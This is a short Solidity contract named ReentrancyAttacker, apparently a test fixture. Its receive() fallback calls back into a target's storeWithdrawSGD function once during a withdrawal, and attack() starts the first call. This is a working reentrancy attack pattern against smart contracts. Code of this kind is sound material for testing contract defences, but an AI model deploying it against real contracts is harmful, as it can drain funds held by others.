// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IAid {
    function storeWithdrawSGD(uint256 amount) external;
}

contract ReentrancyAttacker {
    IAid public aid;
    bool public attacked;

    constructor(address aidAddress) {
        aid = IAid(aidAddress);
    }

    receive() external payable {
        if (!attacked) {
            attacked = true;
            aid.storeWithdrawSGD(1);
        }
    }

    function attack() external {
        aid.storeWithdrawSGD(1);
    }
}
